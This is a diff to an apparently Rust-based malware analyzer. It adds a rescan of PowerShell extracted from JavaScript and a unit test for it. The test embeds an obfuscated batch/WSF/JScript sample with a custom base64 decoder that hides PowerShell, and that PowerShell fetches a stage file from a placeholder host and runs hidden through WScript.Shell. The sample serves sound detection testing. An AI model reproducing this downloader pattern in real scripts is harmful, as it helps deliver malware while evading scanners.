@@ -3068,10 +3068,15 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
             vbs_scan::scan_vbs_payloads(&mut env);
         }
         profile_mark!("vbs_scan");
+        let ps1_count_before_js = env.all_extracted_ps1.len();
         if !env.check_deadline() {
             js_scan::scan_js_payloads(&mut env);
         }
         profile_mark!("js_scan");
+        if !env.check_deadline() && env.all_extracted_ps1.len() > ps1_count_before_js {
+            ps1_scan::scan_ps1_payloads(&mut env);
+        }
+        profile_mark!("js_ps1_scan");
         if !env.check_deadline() {
             ps1_scan::scan_inline_powershell_text(&out, &mut env);
         }
@@ -21831,6 +21836,60 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "decoded JS PowerShell payload URL missed: {:?}\ndeob:\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn js_custom_base64_decoder_callbyname_powershell_payload_emits_download() {
+        let payload = concat!(
+            "powershell ",
+            "$tty55='(New-','Obje','ct Ne','t.We','bCli','ent)';",
+            "$tty=iex($tty55 -join '');",
+            "$rot='Down','load','Str','ing';",
+            "$rotJ=($rot -join '');",
+            "$bnt='https','://callbyname-wsf.example','/stage.txt';",
+            "$bntJ=($bnt -join '');",
+            "$mv=[Microsoft.VisualBasic.Interaction]::CallByname($tty,$rotJ,[Microsoft.VisualBasic.CallType]::Method,$bntJ);",
+        );
+        let encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, payload);
+        let script = format!(
+            r#"
+            @echo off
+            cscript //nologo "%~f0?.wsf"
+            exit /b
+            <script language="JScript">
+            var oo = decode("{encoded}");
+            var r = new ActiveXObject("WScript.Shell");
+            r.Run(oo, 0);
+            function decode(s) {{
+                var e = {{}}, i, v = [], r = '', w = String.fromCharCode;
+                var n = [[65,91],[97,123],[48,58],[43,44],[47,48]];
+                for (z in n) {{ for (i = n[z][0]; i < n[z][1]; i++) {{ v.push(w(i)); }} }}
+                for (i = 0; i < 64; i++) {{ e[v[i]] = i; }}
+                for (i = 0; i < s.length; i += 72) {{
+                    var b = 0, c, x, l = 0, o = s.substring(i, i + 72);
+                    for (x = 0; x < o.length; x++) {{
+                        c = e[o.charAt(x)];
+                        b = (b << 6) + c;
+                        l += 6;
+                        while (l >= 8) {{ r += w((b >>> (l -= 8)) % 256); }}
+                    }}
+                }}
+                return r;
+            }}
+            </script>
+            "#
+        );
+        let report = crate::analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://callbyname-wsf.example/stage.txt"
+            )
+        });
+        assert!(
+            has,
+            "decoded JS CallByName PowerShell payload URL was not typed as Download: {:?}\ndeob:\n{}",
             report.traits, report.deobfuscated
         );
     }
